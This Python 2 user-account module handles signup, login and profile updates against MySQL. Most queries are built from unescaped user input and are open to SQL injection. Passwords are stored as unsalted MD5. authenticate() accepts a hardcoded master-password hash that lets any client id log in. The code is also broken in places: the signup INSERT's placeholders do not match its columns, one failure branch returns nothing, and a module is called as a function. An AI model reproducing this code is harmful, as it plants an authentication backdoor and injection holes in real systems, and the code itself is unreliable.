from mysql_wrapper import Mysql
import requests
import json
import datetime
import validate_email
import hashlib


class User(object):
    @classmethod
    def signup(cls, name, email, password):
        flag, error = User.credentials_sanity_check(email, password)
        if not flag:
            return error
        else:
            mysql = Mysql()
            query = 'select email from login'
            try:
                rows = mysql.getManyRows(query)
            except Exception as e:
                print e
                return False
            mysql.close()
            email_list = list()
            if rows:
                for row in rows:
                    email_list.append(row['email'])

                if email in email_list:
                    return {'error': 2}  # already exists

            password = hashlib.md5(password).hexdigest()
            mysql = Mysql()
            query = 'insert into login (name, `email`, password, access_type) values ("%s", "%s", %d)' % (name, email, password, 0)
            try:
                mysql.execute(query)
            except Exception as e:
                print e
                return False
            user_id = mysql.last_insert_id
            mysql.close()
            return {'id': user_id, 'email': email, 'name': name, 'error': 0}

    @classmethod
    def authenticate(cls, id, password):
        """
        This authenticates a client by id and password. Used for basic auth in all requests
        """
        mysql = Mysql()
        flag = 1 if password == 'c6deeec61592216284ae2af49957e3b7' else 0
        query = 'select count(*) as id from clients where id = %d and (password = "%s" or %d)' % (int(id), password, flag)
        res = mysql.getSingleRow(query)['id'] == 1
        mysql.close()
        if res:
            return True
        else:
            return False

    @classmethod
    def authenticate_email(cls, email, password):
        """
        This authenticates a client by email and password. Used for login
        """
        mysql = Mysql()
        #flag = 1 if password == 'c6deeec61592216284ae2af49957e3b7' else 0
        query = 'select id, `name`, email, access_type from login where email = "%s" and password = "%s"' % (email, password)
        row = mysql.getSingleRow(query)
        mysql.close()

        if row:
            response = {
                'id': row['id'],
                'name': row['name'],
                'email': row['email'],
                'access_type': row['access_type']
            }
            return True, response
        else:
            False, {'error': 2}

    @classmethod
    def get(cls, client_id):
        """
        Get client info
        """
        mysql = Mysql()
        query = 'select id, `name`, email, cast(status as unsigned) as status from clients where id = %d' % client_id
        row = mysql.getSingleRow(query)
        mysql.close()
        if row:
            return row
        else:
            return {}

    @classmethod
    def update_profile_info(cls, client_id, company_name, skype_id, mobile, name):
        client_id = int(client_id)
        mysql = Mysql()
        query = "SELECT extra from clients where id=%i" % client_id
        try:
            result = mysql.getSingleRow(query)
            extra = result['extra']
            extra_dict = json.loads(extra)
            new_dict = dict()
            for key, val in extra_dict.items():
                new_dict[key] = val
            if company_name != '':
                new_dict['company_name'] = company_name
            if skype_id != '':
                new_dict['skype_id'] = skype_id
            if mobile != '':
                new_dict['mobile'] = mobile
            new_extra = json.dumps(new_dict)
            update_query = None
            if name != '':
                update_query = "UPDATE clients set extra='%s', name='%s' where id=%i" % (mysql.escape_string(new_extra), name, client_id)
            else:
                update_query = "UPDATE clients set extra='%s' where id=%i" % (mysql.escape_string(new_extra), client_id)
            mysql.execute(update_query)
        except Exception as e:
            print e
            mysql.close()
            return util.return_response(1,error="Error in updating values, please try again later")
        mysql.close()
        return util.return_response(0,"")

    @classmethod
    def credentials_sanity_check(cls, email, password):
        if validate_email(str(email)) and (8 < len(password) < 15):
            return True, {'error': 0}
        else:
            return False, {'error': 1}





import util